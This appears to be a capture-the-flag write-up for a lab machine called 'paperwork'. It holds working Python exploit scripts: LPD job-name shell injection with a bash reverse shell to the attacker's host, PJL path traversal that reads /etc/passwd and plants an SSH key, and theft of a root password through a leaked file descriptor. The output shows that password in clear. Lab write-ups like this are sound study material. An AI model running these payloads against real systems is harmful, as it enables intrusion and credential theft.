### Nmap
```
nmap -sV -sC -vv 10.129.50.162

---OUTPUT---
Nmap scan report for 10.129.50.162
Host is up, received echo-reply ttl 63 (0.017s latency).
Scanned at 2026-07-16 08:13:46 EDT for 8s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 nginx 1.28.0 (Ubuntu)
|_http-title: Did not follow redirect to http://paperwork.htb/
|_http-server-header: nginx/1.28.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![[Pasted image 20260716081740.png]]

- It holds a zip file which has `server.py`. On unzipping and reading it we find that :
### Bug 1 — broken queue validation
```
VALID_QUEUE = os.environ.get("LPD_QUEUE")   # e.g. "archive_intake"
...
if queue not in VALID_QUEUE:
```


- This should be `queue != VALID_QUEUE`, but in on a string checks substring containment, not equality. So any queue name that's a substring of "archive_intake" passes — "archive", "intake", "a", even "" (empty string is a substring of everything in Python). You don't need to know or guess the real queue name at all.
### Bug 2 — shell injection via job name
```
job_name = "Unknown"
for line in decoded_content.split('\n'):
    line = line.strip()
    if line.startswith('J'):
        job_name = line[1:]
        break
...
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```
- job_name comes straight from the LPD control file's J line (job name field, standard in RFC 1179 control files) with zero sanitization, then gets f-string'd into a shell=True Popen call. Since it's dropped inside single quotes, you can't inject with just ; (it stays literal inside '...') — you need to close the quote first, run your command, then re-open a quote so the rest of the line (>> /tmp/archive.log) still parses:
```
J'; <your command>; echo '
```
gives you:
```
echo 'Archive: '; <your command>; echo '' >> /tmp/archive.log
```

- Protocol patht he server expects:
```
Protocol flow the server expects (simplified from the code):

1. \x02 + queue + \n → server ACKs \x00 if the (broken) check passes
2. \x02 + <size> <filename> + \n → server ACKs \x00 unconditionally
3. raw content bytes (the control file, containing your J... line) → server parses it, runs the Popen, ACKs twice
```
### Initial Foothold
- With netcat listener on 9999 we run the following PoC :
```
cat poc.py 

---OUTPUT---
import socket, sys

TARGET = "10.129.50.186"   # box IP
PORT   = 1515
LHOST  = "10.10.16.41"   # your tun0 IP
LPORT  = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET, PORT))

# Step 1: open a job on any substring of the real queue — empty string works
s.send(b"\x02" + b"" + b"\n")
print("queue ack:", s.recv(1024))

# Step 2: build control file content with malicious job name
cmd = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
ctrl_file = f"H attacker\nP root\nJ'; {cmd}; echo '\n".encode()

header = f"\x02{len(ctrl_file)} cfA001attacker\n".encode()
s.send(header)
print("size ack:", s.recv(1024))

s.send(ctrl_file)
print("content ack:", s.recv(1024))

s.close()
```

- I get a shell as user `lp`
![[Pasted image 20260716110309.png]]

- Looking around I find an interesting process running (via linpeas or `ps -aux`)
![[Pasted image 20260716110411.png]]
```
archivi+     986  0.0  0.4  28040 17488 ?        Ss   12:11   0:00 /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ /home/archivist/printer/logs/commands.log
```

- Checking open ports I see `9100` is open which matches jetdirect port which is used:
![[Pasted image 20260716110519.png]]

- I createa a tunnel with ligolo:
```
---LOCAL-MACHINE---
./proxy -selfcert -laddr 0.0.0.0:9000
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 240.0.0.1/32 dev ligolo

---ON-TARGET---
./agent -connect 10.10.16.41:9000 -ignore-cert

---ON-LOCAL-AGAIN-LIGOLO SESSION--
session
> 1
> start
```

- Then using netcat I listen on this port:
```
nc -nv 140.0.0.1 9100


---OUTPUT---
(UNKNOWN) [240.0.0.1] 9100 (?) open
```
- Looking online it seems passing PJL commands through this port causes execution

![[Pasted image 20260716111042.png]]

- I check by listing directories and get an output:
```
@PJL FSDIRLIST NAME="0:\" ENTRY=1 COUNT=65535

---OUTPUT---
. TYPE=DIR
.. TYPE=DIR
logs TYPE=DIR SIZE=4096
jetdirect.py TYPE=FILE SIZE=5119
```
![[Pasted image 20260716111155.png]]


- I then try to read it:
```
@PJL FSUPLOAD NAME="0:\jetdirect.py" OFFSET=0 SIZE=5119

---OUTPUT---
@PJL FSUPLOAD NAME="0:\jetdirect.py" SIZE=5119
#!/usr/bin/env python3

import os
import sys
import socket
import logging
import re
import hashlib

class PJLServer:
    def __init__(self):
        self._server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def listen(self, port=9100, backlog=100):
        self._server.bind(("127.0.0.1", port))
        self._server.listen(backlog)
        logging.info("Listening on port %d" % port)

    def accept(self):
        client, addr = self._server.accept()
        logging.info("[%s] connected" % addr[0])
        return PJLClient(client, addr[0])

class PJLClient:
    def __init__(self, client, address):
        self._client = client
        self._address = address

    def get_line(self):
        """Reads until a newline to get a single PJL command."""
        line = b""
        while True:
            char = self._client.recv(1)
            if not char: return None
            line += char
            if char == b"\n": break
        return line

    def reply(self, message):
        if isinstance(message, str):
            message = message.encode("utf-8")
        self._client.sendall(message)

    def close(self):
        self._client.close()

class Filesystem:
    def __init__(self, root_dir):
        self._root = os.path.abspath(root_dir)

    def _translate(self, path):
        clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
        return os.path.normpath(os.path.join(self._root, clean))

    def listdir(self, name=""):
        target = self._translate(name)
        if not os.path.exists(target): return "FILEERROR=1"
        try:
            items = os.listdir(target)
            res = [". TYPE=DIR", ".. TYPE=DIR"]
            for i in items:
                p = os.path.join(target, i)
                res.append(f"{i} TYPE={'DIR' if os.path.isdir(p) else 'FILE'} SIZE={os.path.getsize(p)}")
            return "\n".join(res)
        except: return "FILEERROR=1"

    def read(self, path):
        target = self._translate(path)
        if os.path.isfile(target):
            with open(target, "rb") as f: return f.read()
        return None

    def write(self, path, data):
        target = self._translate(path)
        try:
            os.makedirs(os.path.dirname(target), exist_ok=True)
            with open(target, "wb") as f: f.write(data)
            return "OK"
        except: return "FILEERROR=1"

fs = None

def handle_download(command, client):
    m = re.search(r'NAME\s*=\s*"([^"]+)"\s*SIZE\s*=\s*(\d+)', command, re.I)
    if not m: return "FILEERROR=1"
    path, size = m.group(1), int(m.group(2))
    
    logging.info(f"Receiving file: {path} ({size} bytes)")
    data = b""
    while len(data) < size:
        chunk = client._client.recv(min(size - len(data), 4096))
        if not chunk: break
        data += chunk
    return fs.write(path, data)

def handle_upload(command):
    m = re.search(r'NAME\s*=\s*"([^"]+)"', command, re.I)
    if not m: return "FILEERROR=1"
    path = m.group(1)
    data = fs.read(path)
    if data is None: return "FILEERROR=1"
    header = f'@PJL FSUPLOAD NAME="{path}" SIZE={len(data)}\n'.encode("utf-8")
    return header + data

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <PORT> <ROOT_DIR>")
        sys.exit(1)

    fs = Filesystem(sys.argv[2])
    LOG_FILE = "/home/archivist/printer/logs/commands.log"
    logging.basicConfig(
        level=logging.INFO,
        format="%(message)s",
        handlers=[
            logging.FileHandler(LOG_FILE),
            logging.StreamHandler(sys.stdout)
        ]
    )
    server = PJLServer()
    server.listen(int(sys.argv[1]))

    while True:
        client = server.accept()
        while True:
            line_bytes = client.get_line()
            if not line_bytes: break
            
            # Filter protocol noise
            if b"@" not in line_bytes: continue
            line = line_bytes[line_bytes.find(b"@"):].decode("utf-8", errors="ignore").strip()
            
            if not line.startswith("@PJL"): continue
            logging.info(f"Command: {line}")

            if "FSDOWNLOAD" in line.upper():
                res = handle_download(line, client)
                client.reply(res + "\r\n")
            elif "FSUPLOAD" in line.upper():
                res = handle_upload(line)
                client.reply(res)
            elif "FSDIRLIST" in line.upper() or "FSQUERY" in line.upper():
                m = re.search(r'NAME\s*=\s*"([^"]+)"', line, re.I)
                res = fs.listdir(m.group(1) if m else "0:/")
                client.reply(res + "\r\n")
            elif "INFO ID" in line.upper():
                client.reply("HP LASERJET 4ML\r\n")
            elif "INFO FILESYS" in line.upper():
                client.reply("VOLUME TOTAL SIZE FREE SPACE LOCATION LABEL STATUS\n0:     1755136    1718272    <HT>     <HT>  READ-WRITE\r\n")
            elif "ECHO" in line.upper():
                client.reply(line + "\r\n")
            else:
                client.reply("OK\r\n")
        client.close()
```
![[Pasted image 20260716111313.png]]

- On reading it we see there is a vulnerability for path traversal here:
```
def _translate(self, path):
    clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
    return os.path.normpath(os.path.join(self._root, clean))
```
- It strips 0: and backslashes, but never checks that the resulting normpath is still inside self._root. So if you feed it ../../../etc/passwd, os.path.join(root, "../../../etc/passwd") + normpath walks straight out of the sandboxed directory. This affects both FSUPLOAD (read) and FSDOWNLOAD (write) — and this whole thing runs as archivist, so you get arbitrary file read/write as that user.

- To confirm let's test it with the command:
```
@PJL FSUPLOAD NAME="0:../../../../../../etc/passwd"

---OUTPUT---
@PJL FSUPLOAD NAME="0:../../../../../../etc/passwd" SIZE=1672

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:997:997:System Message Bus:/nonexistent:/usr/sbin/nologin
systemd-resolve:x:991:991:systemd Resolver:/:/usr/sbin/nologin
_chrony:x:101:103:Chrony daemon:/var/lib/chrony:/usr/sbin/nologin
usbmux:x:102:46:usbmux daemon:/var/lib/usbmux:/usr/sbin/nologin
polkitd:x:990:990:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack:/var/lib/tpm:/bin/false
fwupd-refresh:x:988:988:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:987:65534:sshd user:/run/sshd:/usr/sbin/nologin
archivist:x:1000:1000:archivist:/home/archivist:/bin/bash
_laurel:x:999:987::/var/log/laurel:/bin/false
```
![[Pasted image 20260716111505.png]]

- I try to grab ssh file but i get an error:
![[Pasted image 20260716111605.png]]
```
@PJL FSUPLOAD NAME="0:../../../../../../home/archivist/.ssh/id_rsa"
FILEERROR=1
```

- Instead I try to write into authorized_keys at target. First I create the ssh file locally:
```
ssh-keygen -t ed25519 -f htb_key -N ""
Generating public/private ed25519 key pair.
Your identification has been saved in htb_key
Your public key has been saved in htb_key.pub
The key fingerprint is:
SHA256:ciIW7hmBK17zjJTZwWttagmkhatLUBRV+OGdQSkcug8 kali@kali
The key's randomart image is:
+--[ED25519 256]--+
|  oo.+oo..       |
| ...o.+ o        |
| .oo+= + o       |
| .=o++* o        |
|oo.BE+ooS        |
|+.ooB*++         |
|.o .o*.          |
|..  .            |
|.                |
+----[SHA256]-----+

```

- Read it:
```
cat htb_key.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDkICNiCHbe2b7ULIVDyv/0FhFsTquPap3Mw4AT86phP kali@kali
```

- Finally I need to write it cleanly onto the target. For this I use the following script (from Claude):
```
cat pocssh.py 
import socket

TARGET = "240.0.0.1"
PORT = 9100

pubkey = open("htb_key.pub").read().strip() + "\n"
data = pubkey.encode()
size = len(data)

traversal = "0:../../../../../../home/archivist/.ssh/authorized_keys"
cmd = f'@PJL FSDOWNLOAD NAME="{traversal}" SIZE={size}\r\n'.encode()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(10)
s.connect((TARGET, PORT))

s.sendall(cmd)
s.sendall(data)

resp = s.recv(4096)
print("Response:", resp)
s.close()
```

- Executing it I get an OK response:
![[Pasted image 20260716111823.png]]

- I set the permissions for the key and log in with it:
```
chmod 0600 htb_key
ssh -i htb_key archivist@paperwork.htb
```
![[Pasted image 20260716111910.png]]

- I grab the user flag:
![[Pasted image 20260716111927.png]]

### Privilege Escalation
- Looking at processes I find an interesting one that I can read with my current user:
```
ps -aux | grep "root"

---RELEVANT-OUTPUT---
root        1480  0.0  0.4  28432 17960 ?        Ss   13:49   0:00 /usr/bin/python3 /usr/bin/paperwork-daemon
```

- I read the daemon:
```
cat /usr/bin/paperwork-daemon
#!/usr/bin/python3
import socket, os, array, hashlib
import zipfile
import shutil

try:
    admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)
except Exception:
    os._exit(1)

LOG_PATH = "/home/archivist/printer/logs/commands.log"

def get_admin_secret():
    data = os.pread(admin_fd, 1024, 0).decode().strip()
    if "ADMIN_PASSWORD=" in data:
        return data.split("ADMIN_PASSWORD=")[1].split("\n")[0]
    return data

def scan_for_malice():
    if not os.path.exists(LOG_PATH):
        return False
    with open(LOG_PATH, 'r') as f:
        content = f.read().upper()
        if any(trigger in content for trigger in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]):
            return True
    return False

def trigger_lockdown(conn):
    try:
        log_fd = os.open(LOG_PATH, os.O_RDONLY)
        evidence_bundle = array.array("i", [log_fd, admin_fd])
        msg = b"ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED."
        conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])

        zip_path = "/root/quarantine/evidence.zip"
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(LOG_PATH, arcname="commands.log")


        with open(LOG_PATH, 'w') as f:
            f.truncate(0)

        os.close(log_fd)
    except:
        pass

def main():
    socket_path = "/run/paperwork/mgmt.sock"
    if os.path.exists(socket_path): os.remove(socket_path)
    if not os.path.exists("/run/paperwork"): os.makedirs("/run/paperwork")

    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.bind(socket_path)
    os.chmod(socket_path, 0o660)
    os.chown(socket_path, 0, 1000) 
    s.listen(5)

    while True:
        conn, _ = s.accept()
        
        if scan_for_malice():
            trigger_lockdown(conn)
        else:
            secret = get_admin_secret()
            token = hashlib.sha256(f"SYSTEM_CLEAN:{secret}".encode()).hexdigest()
            conn.sendall(f"STATUS: SYSTEM_CLEAN\nSIGNATURE: {token}\n".encode())
            
        conn.close()

if __name__ == "__main__":
    main()
```

- There is an interesting SCM_RIGHTS file descriptor parsing bug here.
- admin_fd is opened once at startup, as root, pointing to /etc/paperwork/admin_pins.conf — a file archivist almost certainly can't read directly (root-only perms). Normally that's fine... except trigger_lockdown() sends that already-open fd to whoever connects to the socket, via sendmsg(..., SCM_RIGHTS, [log_fd, admin_fd]). That's a Unix domain socket ancillary-data mechanism for passing open file descriptors between processes — and critically, the receiving process inherits full read access to that fd, regardless of its own permissions on the underlying file, because the kernel already validated access when root opened it.
- The trigger condition (scan_for_malice()) checks if commands.log contains FSQUERY, FSUPLOAD, or FSDOWNLOAD — and you already logged exactly those commands through jetdirect.py's command logger during the traversal exploit. So the lockdown path is almost certainly already primed to fire on your very next connection.

- Using the following script (sent to target) I manage to gain root password:
```
import socket, array, os

path = "/run/paperwork/mgmt.sock"
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect(path)

fds = array.array("i")
maxfds = 2
msg, ancdata, flags, addr = s.recvmsg(4096, socket.CMSG_LEN(maxfds * fds.itemsize))

for cmsg_level, cmsg_type, cmsg_data in ancdata:
    if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
        fds.frombytes(cmsg_data[:len(cmsg_data) - (len(cmsg_data) % fds.itemsize)])

print("Message:", msg)
print("FDs received:", list(fds))

for fd in fds:
    try:
        data = os.pread(fd, 4096, 0)
        print(f"FD {fd} contents:\n{data.decode(errors='ignore')}")
    except Exception as e:
        print(f"FD {fd} error: {e}")
```

- Running it on the target gives me the password:
```
python3 pe.py
Message: b'ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.'
FDs received: [4, 5]
FD 4 contents:
Listening on port 9100
Listening on port 9100
Listening on port 9100
Listening on port 9100
Listening on port 9100
Listening on port 9100
Listening on port 9100
Listening on port 9100
Listening on port 9100
Listening on port 9100
Listening on port 9100
Listening on port 9100
Listening on port 9100
Listening on port 9100
Listening on port 9100
Listening on port 9100
[127.0.0.1] connected
Command: @PJL FSDIRLIST NAME="0:\" ENTRY=1 COUNT=65535
Command: @PJL FSUPLOAD NAME="0:\jetdirect.py" OFFSET=0 SIZE=5119
Command: @PJL FSUPLOAD NAME="0:../../../../../../etc/passwd"
[127.0.0.1] connected
Command: @PJL FSDOWNLOAD NAME="0:../../../../../../home/archivist/.ssh/authorized_keys" SIZE=91
Receiving file: 0:../../../../../../home/archivist/.ssh/authorized_keys (91 bytes)
[127.0.0.1] connected
Command: @PJL FSDOWNLOAD NAME="0:../../../../../../home/archivist/.ssh/authorized_keys" SIZE=91
Receiving file: 0:../../../../../../home/archivist/.ssh/authorized_keys (91 bytes)

FD 5 contents:
ADMIN_PASSWORD=ApparelMortuaryCedar22
```

- I ssh to the target as root:
```
ssh root@paperwork.htb 
> ApparelMortuaryCedar22
```

![[Pasted image 20260716112403.png]]

- I grab the root flag:
![[Pasted image 20260716112426.png]]